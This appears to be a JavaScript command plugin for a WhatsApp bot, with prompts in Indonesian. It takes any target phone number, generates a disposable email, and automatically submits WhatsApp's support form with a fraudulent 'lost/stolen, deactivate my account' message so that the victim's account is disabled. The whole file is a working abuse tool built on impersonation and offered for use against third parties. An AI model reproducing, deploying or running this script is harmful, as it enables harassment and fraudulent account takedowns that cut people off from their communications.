import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = m.quoted ? m.quoted.sender : args ? args.join(" ") : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
if (!q) throw '*Masukan nomor target!*\n*Contoh: +62 8xx xxxx-xxxx*'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Payload: *TRUE*\n## Dukungan WhatsApp ##\n\nHalo,\n\nTerima kasih atas pesan Anda.\n\nKami telah menonaktifkan akun WhatsApp Anda. Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut. Harap diperhatikan: Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.\n\nSelama periode kuncian:\n • Kontak Anda di WhatsApp mungkin masih melihat nama dan foto profil Anda.\n • Pesan apa pun yang mungkin dikirim kontak Anda ke akun tersebut akan tetap ada dalam status tertunda hingga 30 hari.\n\nJika Anda ingin memulihkan akun Anda, daftarkan ulang akun Anda sesegera mungkin.\nDaftarkan ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau telepon. Jika Anda mendaftar ulang\n\nJika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami. Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Payload: *FALSE*\n##- Dukungan WhatsApp -##\n\nHalo,\n\nTerima kasih atas pesan Anda.\n\nUntuk melanjutkan permintaan Anda, kami perlu memverifikasi bahwa nomor telepon ini milik Anda. Kirimkan dokumentasi yang memungkinkan kami memverifikasi kepemilikan nomor tersebut, seperti salinan tagihan telepon atau kontrak layanan Anda.\n\nPastikan untuk memasukkan nomor telepon Anda dalam format internasional lengkap. Untuk informasi selengkapnya tentang format internasional, silakan lihat artikel ini.\n\nJika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami. Kami akan dengan senang hati membantu Anda.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.command = /^(kenon2|reportwa)$/i
handler.rowner = true 

export default handler